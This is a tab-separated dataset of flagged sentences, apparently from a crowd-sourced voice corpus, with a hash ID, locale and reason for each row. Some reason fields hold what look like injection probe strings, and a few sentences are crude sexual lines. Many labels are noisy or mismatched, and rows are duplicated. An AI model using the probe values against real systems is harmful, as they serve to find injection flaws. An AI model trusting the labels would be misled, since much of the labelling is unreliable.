sentence	sentence_id	locale	reason
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	1'"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	@@DtTzO
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
Lysenko, Columbia Univ.	de4e8215d69472433a90ccb16c05e6fbba8ab9741befae13434e58bbc266859b	en	grammar-or-spelling
The water chain appears to be a conserved feature of cyt f.	ddeb4adc5e30fd65d73f6df0da0c6781a8ddf7deecfdbe531b7aae66036c3799	en	grammar-or-spelling
Mrs. Reid appeared behind the bar.	de5b49ad9afc58dd602fcb8333a4e9915330e3babb196c9a9d86a54be70c0021	en	grammar-or-spelling
کچھ کھانے کی خواہش ہے؟ 
	59e732d0ff65777ff81fbfd01d67f8c1f585e97369d3e7b462004a9342db674a	en	sc-different-language
. زندگی کو بے فکری سے گزاریں۔	5a90cd1b9619453524b1e62ac539689af4f349d14526fe7ae997f81699386df0	en	sc-different-language
آپ کا نام کیا ہے؟
	5b429861462cb47813b65a2ed45cc2a329f99a74619f65ad26526996153c21a9	en	sc-different-language
. اپنے اہم لکشیوں کو برآمد کریں۔
	5b9246c4e295d5bed521c9c625b8c59f63e6ee658fe01b46801d96fef11c2e32	en	sc-different-language
کتابوں کی خریداری کرنی ہے.
	5ffebd83e041195f1b8fcbfe14b89f452e94bbab9d4b76557e4f6eed3ce22281	en	sc-different-language
کچھ لذیذ کھانا پسند ہے.
	60807f66b662f0c0022451b3f56fd66589afd674df0adcc69cc203ad6ada3eb2	en	sc-different-language
اتنی جلدی کیوں؟	611fa41107f25e4de26e370c4b05026b231107a4fb2b5f609c5270049ac857e5	en	sc-different-language
برف باری بہت خوبصورت ہے.
	612d5c8d6c6349f4c421290ab7e2847c0b0208fe731498317c1bfc5ef1e999e2	en	sc-different-language
دوسروں کے ساتھ احترام کا اظہار کریں اور ان کے ساتھ اچھے تعامل کریں۔

	61764a05edcf105d3a6f17a550858f73c5490b8237ef163aa68b96894b7021ae	en	sc-different-language
وہ اپنی ماں کا ساتھ ہے.
	617d927918e24eca20e18e4516d637d83d964d810f426e28634538ebe25f6407	en	sc-different-language
Frieze (textile)	ded4c4711d9cbb19f54035e04623b278c811845bd7d10fc60d7669e78b595aa7	en	grammar-or-spelling
He completed Phd.	ded93e571accb840d077a4475f1aa855f2613ce7aa73650f0a0ba7117195e617	en	grammar-or-spelling
The construction was carried out by Fr.	dedc09d90c40c251717101e90b048bb8e6166f8e88617056f9a62f11493e16c4	en	grammar-or-spelling
Like all stations in the Market Street Subway, Embarcadero has a tri-level configuration.	df37c1964a0e9ae64f8495ed9ec60eff43df2ce7c324b4eb6486f03c8253ebc4	en	difficult-pronounce
During this period he accompanied Maximilian on his Bohemian campaign.	df2ee0a73b3fb90ed359d6bdacab6e5aca63397a2c1439e6198257fa3673abee	en	difficult-pronounce
Most staphylinoids are middle-sized or small beetles with a pair of shortened elytra.	df37fe75e49ae223de28acb070dea8213ad31d834aef7201ecad18a4c091d549	en	difficult-pronounce
Manumaleuna recorded a season-high four receptions against the Green Bay Packers.	def13f02ffa444f163ab94b38a62d3e647b942501076ed9665a0f29015b5e369	en	difficult-pronounce
Please do not touch my penis. 	22494f3988b0022d454d8a49b1c78a535048fa970b0c25dc286d831df3636c4d	en	Mentioned touching penis
اتنی جلدی کیوں؟	611fa41107f25e4de26e370c4b05026b231107a4fb2b5f609c5270049ac857e5	en	sc-different-language
برف باری بہت خوبصورت ہے.
	612d5c8d6c6349f4c421290ab7e2847c0b0208fe731498317c1bfc5ef1e999e2	en	sc-different-language
دوسروں کے ساتھ احترام کا اظہار کریں اور ان کے ساتھ اچھے تعامل کریں۔

	61764a05edcf105d3a6f17a550858f73c5490b8237ef163aa68b96894b7021ae	en	sc-different-language
وہ اپنی ماں کا ساتھ ہے.
	617d927918e24eca20e18e4516d637d83d964d810f426e28634538ebe25f6407	en	sc-different-language
اے  اللہ ھمیں سیدھا راستہ دِکھاـ	627cde71fce0c7707f0a905a4b526248b2020c96bad48ae6b4465daa966959c2	en	sc-different-language
Maldives Structural Products Pvt.	df3938ed6cf5df7b96a6a3f3c0490489dee4a0884456e5468166a6a6512a0490	en	grammar-or-spelling
I want you to cum inside me!	676a52b2a6d26768bd2521a0fe81cbc4bd19470cc0924b892a0a7244367eafd7	en	offensive-language
He did not remarry, although he had illegitimate children with his mistress.	df67d1c0b22084dcdbe7192e0c37f95b01fd2160a9455e6e3398b8c970fc1a35	en	CBDGFSREDA ,LOP NB BVHGFDTDRFRGRTRFDCVSREDSAW12
Moreover, in his Damit wir nicht vergessen!	dbfd6b96dc4e8299ee4e203f5106c848bc78ff414338be8de0f217d50169faad	en	different-language
Bis kurz vor Exitus.	6d1de9c9c01ab997e6aa3ffead6ca79cc3565f1935316ea7a224f416c60971be	en	sc-different-language
یہ کتاب بہت مفہوم ہے.
	6e2732fd60355818af1e09b14c849f630011fe9fbba8624c442dfc2fc3ae7baa	en	sc-different-language
دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔	6e49f5f101a7b700880d7d4aad8184561f6dd25f51198a46c5f134ae8b3af61b	en	sc-different-language
. زندگی کو اپنے اہم مقاصد تک پہنچائیں۔
	6f03abcaafff7c93552aa8c80418d0f58259d44c9af1036e761b83455a562161	en	sc-different-language
ان کی میہندی کل منائی جائے گی۔ 
	704c80187d6f30c40a1ca684839e20aadfc54b53ca58fd6a382b596bc672d3e4	en	sc-different-language
کامیابی کی راہوں پر اقدام بڑھائیں اور مقصد تک پہنچیں۔

	7072c68770632444d5a812a7b47a969e69dbee5843f3d9f3c0e32c2982d9b03a	en	sc-different-language
. محبت کا اظہار خوشبوداری کی طرف راہتا ہے۔
	7097f3ed893b1da4e4acce0a323f5b654a6d318aa9097d19138826f9b011d552	en	sc-different-language
برائے مہربانی قیمت کو تھوڑا کم کریں۔
	70bcbe617256154750a2684de43e8a9fc8ca2c91c2c80e93600a53fda335187d	en	sc-different-language
میں اپنی کتاب دھوندتا ہوں.
	70f74c540ec9ec938940df51c630fb69784201033f7a835fe26c1e221bc3e22b	en	sc-different-language
We should read books 	f222a44380dd537fd70517e9ca8cbf7c1114f28f2b941f1bebfdd56b1c25ba04	en	.
The O'Connor family enjoys hiking, scuba diving, music, and travel.	dfb2d44b2f23b959349fc37da763edcac2ddff3a0919980758a56afc7d52c680	en	different-language
The lyrics are unrelated to the Mets or baseball generally.	dfe86dce847fa8d740f7723d68555d5edc7c09e88167fcf7e0affaa64ac5c4b4	en	ciao
Suraj Mal at "Britannica"	dfd8ad27ca24596943e9fe491d26bd06719cc447b3560db0c3f89055de7d699d	en	.
Aesthetics studies the concepts of "beauty" and "harmony.	e0101b09ae8f67e97e8b0fd43a0fe6f1055cc222f8f1b5eb5715d6c371b20766	en	"
Andrew Gleason had no PhD, but considered Mackey to be his advisor.	dfe9a2ef7c767ed7b9fe38cceef0d741216d2eb85f009607336df644188beb8d	en	grammar-or-spelling
Torreense.	e01bfff782e21549600188dbbab4036d24b035fd9c965f6a712ae88bee4feefa	en	different-language
This production propelled the career of William Christie and his ensemble Les Arts Florissants.	e017a7d8b79a2274ceb0e2b36e6e4540e9656da91126bf885ec58d55185037a7	en	different-language
Fessendent received his early education at the Fryeburg Academy in his hometown.	df7e3baa6b6e4db9bed361b3df2a2fb4a36acd2caa6c54b4dc962dd00875a660	en	difficult-pronounce
Pontius Meropius Paulinus was born at Bordeaux, in southwestern France.	e01c7a061d60140cddb5739b35f8cab753732206054f95ef7debf7c5439f336c	en	difficult-pronounce
Blumlein envisaged introduction of surround sound in the film industry.	e009559c8afcdb8437bfed4b426bc0c9f422a57715c572b064ff7f029fec120f	en	difficult-pronounce
Anagnostakis' poetry has been described as "terse".	dfefb3f3f0fc0e03cb067eab3bd35c815115236b7aac4f639d245731b90e0017	en	difficult-pronounce
For this reason Thoth was universally worshipped by ancient Egyptian scribes.	dffee04072a5de95cc819108b44e6b036a5d4693754a0ce931283e1d7a173104	en	difficult-pronounce
If the connective nerve tissues in the trachea degenerate it causes tracheomalacia.	e00990495440f37bd87b57acdfcc0664a287e6d54fb8c0cac74b03eafb48db8f	en	difficult-pronounce
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	different-language
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	difficult-pronounce
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	grammar-or-spelling
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	offensive-language
The vice-chair was Adele Meyer, who largely funded the enterprise.	e0e5820ab675801d2c9397625520f4287d6ab2b7f1a387177186d280607e2fab	en	good direction speaking
Excuses, ik heb nu even geen tijd, ik moet de kinderen van school halen.	5605e8d3d8fc91cac938e64693a8048295d7f3e8e42eb96c4f582af0f602ce6f	en	sc-different-language
Sentences contributed here will be added to a publicly available licensed dataset	b240bd7734b69c3a43ac6b715c2f2915a243fc7563246cac22c7872080280091	en	.
Talk to a human	c0a43fa49fbf452ed09cbd4ce8f5b87502bf4b2aca5b1c549fab70a5ea9dfcd5	en	.
Tra i due litiganti il terzo gode	c1f740a930048a3921e195f69bf43cc9eb9471dbb972e553e915429aee7c7b41	en	sc-different-language
Fatal poisoning in humans is very rare, usually occurring after consuming yew foliage.	e10b2f02ec6848ef1c86f70b59498f2e6f668919118952b5e60142cd68bbd5f9	en	different-language
Fatal poisoning in humans is very rare, usually occurring after consuming yew foliage.	e10b2f02ec6848ef1c86f70b59498f2e6f668919118952b5e60142cd68bbd5f9	en	c
It means Fuck the Army.	e0f666aa9a3642b7cd8beac2a4006794b5c0b65ebcf918fcb23e4a751bda7c85	en	grammar-or-spelling
The son of Rev.	e0f8f91692f598a74eb6ffb1d14cbb9b4726dc83e3789ba1f96e70616528fd0e	en	grammar-or-spelling
Kaplan wove his New Yorker cartooning into "Seinfeld" with the episode, "The Cartoon.	e1078e61cb9320bcadba38b49f534fa0e6db1ad237489bcc6297650b4471d3c7	en	grammar-or-spelling
Kaplan wove his New Yorker cartooning into "Seinfeld" with the episode, "The Cartoon.	e1078e61cb9320bcadba38b49f534fa0e6db1ad237489bcc6297650b4471d3c7	en	"
Cite with a link or the full name of the work	142dcfc162bb69db1bf88a3cfe68f9fd605ef806a9dae91b80f9ce22189196a5	en	.
Wait, wait, wait! I have a surprise for you, open your bag.	59e4e32ed0d425d12a76ce8fccf79a050b836ba4b6126c4354d7227e18ec5923	en	grammar-or-spelling
it should be easy to read the sentence	6bd80f28a013e6e96e4021f6b31ccbb433d665d9dab554afbc220c5d426e5729	en	.
He later studied at the and began directing short films.	e03280180d32f835fb04fd53d6f25e411d445faca756824892d614630348f13a	en	grammar-or-spelling
This is a speech in natural language	c5f768744e3a657d1e3170d689ccf7995d3dc3110b7f2a518f71c1d44f9cb952	en	.
Excuses, ik heb nu even geen tijd, ik moet de kinderen van school halen.	5605e8d3d8fc91cac938e64693a8048295d7f3e8e42eb96c4f582af0f602ce6f	en	sc-different-language
Was hast du gemacht?	7497bc3b95bcb0e235a378f423f747b95416a26c7cfa220815738c0222b85107	en	sc-different-language
 دوسروں کے ساتھ احترام کا اظہار کریں اور ان کے ساتھ اچھے تعامل کریں۔	77cb96ccfe537484f146e100f9d82bd20fe4a822138692e8d4b12024c7947d1b	en	sc-different-language
დაღამდა და მანქანებმა ქუჩა დატოვეს.	77f29e386679882e3936b4beab3815a74535b28486ef41e73225d5e1667fad80	en	sc-different-language
اپنی تعلیم اور دانائی کی قدر کریں۔	7819dd95057e560e3bce46b52c75e60cea338a381c3cf47d9a9354fa870a6d50	en	sc-different-language
کیا حماقت ہے؟	78a0c17eb91770672a8e6de44a139ee576988e1929c9e70572dfe0dca42ef642	en	sc-different-language
ہم سب دوست ہیں.
 	792d635c9d4431d7b01daeeb8d737bcafcc151b6d576f46d0f9662dda284cf79	en	sc-different-language
. تعلیم سے دلوں کو بھرنے کی طرف قدم بڑھائیں۔
	799fcabfcb1c840c8f8273cb1719795d13bd67f8d3405ea07298571bf25711ed	en	sc-different-language
. صحتیابی کی قدر کریں اور صحتیاب رہیں۔
	7a12e3de7c1531559fd77e4b3eb4a6a40e2b2230d41e6847e4b3f7b4d40392be	en	sc-different-language
. دوسروں کے ساتھ محبت سے پیش آئیں۔
	7a4c68e8ff09a37ca3b87a5adf88755461e0db820783fc873be6d405b793e450	en	sc-different-language
What am I going to do? I'm such a bad boomer.	a31bcb5b4d71fb67cba8351f732e81531283203a0e6221b87e385817b5acdb13	en	2 sentences
Pei and Samuel Balen.	e138cd2064269c104c262a55ed9a3fedd034c6a2392aecb766e208d76b5bfac4	en	offensive-language
तुम क्या कर रहे हो 	898c30b06a6bf449cba9efbe51b49e9130180e33e1e05661920b6a466ff50783	en	sc-different-language
Guys look better in Speedos, it's true!  Don't wear baggy board shorts.	064ecf4395eaed1ee6f0e6ec8de447d3ac434ef0501b7577a63d6eb65e1cbf19	en	grammar-or-spelling
Guys look better in Speedos, it's true!  Don't wear baggy board shorts.	064ecf4395eaed1ee6f0e6ec8de447d3ac434ef0501b7577a63d6eb65e1cbf19	en	2 sentences
Oh, ok. How much do I owe you? Do you need to?	8b87f031017a15f4a92a6dd2b89abacace966fc82c85f3bc6c8f9ce52094d81d	en	grammar-or-spelling
Mjafton ta kërkosh, ta klikosh dhe prenotosh!	96e7aa8f63dd6cb17cf58f50d6d992d02a6b2ee2939a5ab2948d8938a9767f73	en	sc-different-language
Hattori received a Ph.D. from Showa University.	e19e0cd4858857fa6b506484730262e2ae3c085a17714bc3e4a9601e201ed1ff	en	grammar-or-spelling
He studied philosophy under James Seth at Brown University where he earned his B.	e1a104543cb28f634e1471ba0f9f1d11f407e02a52678df3d09cf2510f86eddf	en	grammar-or-spelling
'Was it good, Mr. Forman? he asked me after every perfect shot.	e1a12e83b5f411bb5e00c5be033c700202218bdeff8f45cd1a33299b06a2727d	en	grammar-or-spelling
Confederate forces defeated the Union's only attempt to capture Charleston, South Carolina, by land.	e201fd917cae4c96b002b5dd2445e813008e68d59b6490cf46c21a985a492688	en	difficult-pronounce
The Greens are member of the European Green Party and the Global Greens.	e208157f7bf60bb90cbf5603a13275c23466b18d1b96d26c793566262bd14273	en	grammar-or-spelling
Men and women danced with thair arms round each other's waists.	8638715ac72daf8b9c1194b4d167fc462bde0cdc74a3780fa2431716f54ea1cc	en	grammar-or-spelling
The tree was shaking in the wind	86ffa9110cde737c5a9308392e08525e8d66f962f63bf3a27e8e84172d096ec4	en	.
John Koenig and music direction by Cpl.	e22460d0e24c189c99fac14e25ffb8fd80b41632fc8256bb7aa9dc00a3d832cd	en	grammar-or-spelling
At AaB, he quickly established himself as a playmaking midfielder.	e24390a2d08cf798431fdb50ba67f6cc429191c5392d19d3ba57ca8633f46d06	en	grammar-or-spelling
Alice said she no knowledge of the diamond.	e2558ea622011794d6b87438e9b08250ab117eee93f972a2647d1872585bb666	en	grammar-or-spelling
The is available in two editions.	e25741a31d3a7e80c630a8df7cfb08e0757b01cfaa703ba7ddf768ff7e4bc5e2	en	grammar-or-spelling
Service disruption affected the eastern route into Bangladesh while western one is not affected.	e24e8be7889ea33354b7c2758d1a54cd034da239d123596fadd033899de50ea9	en	grammar-or-spelling
She also won other award for her performance.	e2201138f852bda1deadf708c08a099367153ec579ecbdb0ff9addc92679a645	en	grammar-or-spelling
In the absence of a catalyst, the equilibrium is reached quite slowly.	e21704a6eeb08bbb79f84e709ce52cb509cfd695c80ed4b24b5ee3601a74a9c1	en	difficult-pronunciation
At the center of town, Mass.	e2678ba7e46f717f1b40b2146c520fd3cbf446f708079ec963708b3ebc532cd6	en	grammar-or-spelling
The map of biogeographic regions is deliberately simplified and ignores local anomalies.	e273476ac045f75345fa03b3fddede65f7325259b72db6a600a00d955a6c98c9	en	difficult-pronounce
The uyezd town was Torzhok.	e252eab8ebf44ef6013400685dc013dadbf222dbc86e80d6d63e46325b77bcd4	en	difficult-pronounce
However, Maserati dominated the early race with Menditeguy and Moss leading the field.	e273db4526890db88f1d388e445c6f24b0df066f60172f02e034a3a0054af701	en	difficult-pronounce
Tiomkin also paid careful attention to the voices of the actors when composing.	e26effec6db5d50b5e79efc8d632c0b9f1263495fa165e2f9da2c95dfcac6bb5	en	difficult-pronounce
According to other sources, he was the son of Belus and Achiroe.	e2712bad5c3635712f372b1b6701b624a9eb80fcb2fc0e6ba152dfa3c28aaf4c	en	difficult-pronounce
This was part of Alcibiades's plan to renew the war with Athens in Attica.	e2639635b017d5e6d381fb29bb7adb274ae638a3c21dc224ef14ada9eb47e913	en	difficult-pronounce
The uyezd town was Torzhok.	e252eab8ebf44ef6013400685dc013dadbf222dbc86e80d6d63e46325b77bcd4	en	difficult-pronounce
The president and trustess serve four-year terms and are elected at large.	e2516c9f6ebb123e7a61073b13e8c0c9066b24322c8d85533c2e4312caee1eb3	en	grammar-or-spelling
It was founded by the Socialist Party and Cymru Goch and some independents.	e2670ebacbd00adec2fb58a79b4d2b1aca08c1c369fb356c962b74f7c07de0a7	en	difficult-pronounce
Medieval, city view, sunset, lively marketplaces, traders, citizens, historical buildings, Charles Angrand style	aeefc11d30dbfedd49c121f1a91d57c5102369fa8a7e6d033f225fc9a81e2f6f	en	.
Taimens grow to huge sizes here; specimens weighing have been caught here.	e28905207c31019e7e35c109f6a534075c0ab8d2953414560d77b091046a4490	en	grammar-or-spelling
The commune is not extensive so it does not any division into districts.	e2902e93fbf6e508b37408ed42279bcefe2e4ad766cbee4342bffeda95626ed7	en	grammar-or-spelling
The site of the furnace is marked on Ordnance Survey maps.	e27a797aba7db9238345ee8864d0a576fe419dfb4968d9d8f1131f7ab20064b3	en	difficult-pronounce
A minimum sea level pressure of was recorded at the Hong Kong Royal Observatory.	e2b3b12280e362176f65583226a9a615db189f7f99faf7de5e33d9c48c4916b8	en	grammar-or-spelling
For many years, Germantown Friends gave academic awards to its students.	e2d651e40276814ff4c939f48c912b20df35b384fa55559792d82f072e685ef4	en	offensive-language
For many years, Germantown Friends gave academic awards to its students.	e2d651e40276814ff4c939f48c912b20df35b384fa55559792d82f072e685ef4	en	grammar-or-spelling
For many years, Germantown Friends gave academic awards to its students.	e2d651e40276814ff4c939f48c912b20df35b384fa55559792d82f072e685ef4	en	different-language
For many years, Germantown Friends gave academic awards to its students.	e2d651e40276814ff4c939f48c912b20df35b384fa55559792d82f072e685ef4	en	difficult-pronounce
Mjafton ta kërkosh, ta klikosh dhe prenotosh!	96e7aa8f63dd6cb17cf58f50d6d992d02a6b2ee2939a5ab2948d8938a9767f73	en	sc-different-language
हेलो मेरा नाम अभिषेक है।  आज मैं आपको Artificial  इंटेलिजेंस के बारे मैं बताऊंगा। 	9a4af5b88553ad1c613cc45382e6e87e4110bdecba2fc89b331b4d263e36b3a1	en	sc-different-language
ہمیں موسیقی پسند ہے.
	9a9d532bd923e390c0aa19d6e4d0c49ef51db8075fbc9e928bf1b1cd3e141360	en	sc-different-language
Bella has suffered from a pulmonary embolism for some time	9e43cab1955e47ae937f614ed475329bd62d2c1c97be1377f2b513b4070b1f9a	en	.
Have you been to the new ice cream shop in neighborhood?	9b6b658fd89629512915843228d05e86d145ba3534d07ee4fbd80601c1411526	en	grammar-or-spelling
In the winter, basketball and table tennis are offered for both boys and girls.	e346f4e9d526f847c7af6b6b9a0652f7c5be9358c617ee5232d88edd9f6c7c59	en	offensive-language
What makes a job in software engineering attractive?	9f6f800387768a22381db7d5f330b3d295fd807db73ec9967eba117370071b20	en	sc-different-language
Teste de linguagem
	9f7714192711248bee7676e9c3e5b8d34b7586d8a70ee9a6eb1f48773dc95cb9	en	sc-different-language
تمہیں پتا ہے؟ 	9f9c279a51514fff2b0c1d7713d0deb86022540320a0bda62d5566346c579ffb	en	sc-different-language
یک بازی برنامه‌نویسی با ربات‌های کوچک	9feeb28bfccc6001ff50b650ad98d4e40044c40b74af6fa3281f8f2d3515f73c	en	sc-different-language
. دوسروں کی ترسیل کو سمجھنے کی کوشش کریں۔
	a01d2aa5ca2337665889fe224d175911c37f0a35f4f4146f5f50a5480433f35b	en	sc-different-language
The tourists can have the tent has both bring their own tents or rental.	e34bb9b2010dd1f2b20904340a75eaf3755d09c5c511a7fee56c2db27d496f21	en	grammar-or-spelling
Maie Casey.	e34758811252b60256a0e9bf96911b18ac7d85ea5fdae5ba632d5184dba7c184	en	grammar-or-spelling
Ptolemy's deaths are animated in different ways, depending on the enemy who kills her.	e35973060c2f79c70334000f352beeb84e0b5cb1f4c1c05bb464b42f1c559880	en	difficult-pronounce
It is located about halfway between Amiens and Bapaume.	e358247e83e89804163f745b4fa75e5ad4e396d7ddf94d83a49b08660c5129ef	en	difficult-pronounce
The allophones of are quite complex.	e36e52f5e4d32b1b78a0c24927413a6ad525d0520fbdc6b0b306f0c448aa911f	en	grammar-or-spelling
اچھے پڑوسی اللہ کی نعمت ہوتے ھے ـ
	a2960db92b2d39663fb399ac0993aea7e07e38164ad0ea95e6a6f3e05658ccd3	en	sc-different-language
. اپنی تعلیم اور دانائی کی قدر کریں۔
	a42289999aa3e3bfe9eecea8729f91b83ed496ebae6a15f9565053c5e239d2a1	en	sc-different-language
اور بھلا درد کون سہتا ہے ـ	a456539f0251139e2f3c8d10c5d2fcdaecb1e8f6355bd8886e1729c130fd78aa	en	sc-different-language
شەو و ڕۆژ بووین بە گرفت	a464e7de86f07739904cb185f4f54689671a35ee7b69b429cf8ec5f000b8c156	en	sc-different-language
وہ روزانہ ورزش کرتا ہے.
	a4fd5ccac7e19cd4708ff9d8e1659c1652d9e215e63e4cccac7e8e6a811fe8da	en	sc-different-language
The allophones of are quite complex.	e36e52f5e4d32b1b78a0c24927413a6ad525d0520fbdc6b0b306f0c448aa911f	en	grammar-or-spelling
She sells sea shells by the seashore. The shells she sells are surely seashells.	ac16428eb8d7c952792a8fc7b6aa230ea65043fe1c664c64d648f3aa5c9d40a8	en	2 sentences
It's funny to think that someone you don't know wrote this sentence	b2d8352c6833e975e1619246dfae20e8d19a12196d5052bdc65f244ba5c0370e	en	.
Conveniently, the pyrotechnist lives near the fire station	b3ab05beb4cf20b2791a391204df0f033870b8bc24186f31c3a2723a203932db	en	.
The hedgehog ate a strawberry before going about his day	c39d5cdfca33145c80654ccebac2da02aa42b7523d6b4313f7bc3146ad7fcfe3	en	.
There was a rabbit in the house. He was hungry.	c5323b8d9a9e42fabfdf51b95c952bd5020d67ce29a2e0be0cf73ada1e99c8c8	en	grammar-or-spelling
There was a rabbit in the house. He was hungry.	c5323b8d9a9e42fabfdf51b95c952bd5020d67ce29a2e0be0cf73ada1e99c8c8	en	2 sentences
اَلثُّلَاثَاء اَلدَّامِي . . إِسْرَائِيل تَعْتَرِفُ بِأَشْرَسِ يَوْمٍ فِي مَعَارِكَ غَزَّةَ	dda2ffd1273bfe664d803d07c8d265b0b9d5d69803ae565276081a5783ad4d09	en	sc-different-language
All those officials were responsibility for the Solomons as well.	e363d095cf4bcf093235246e124aad9f7e57869b765aa5c8c1bb965344d284ab	en	grammar-or-spelling
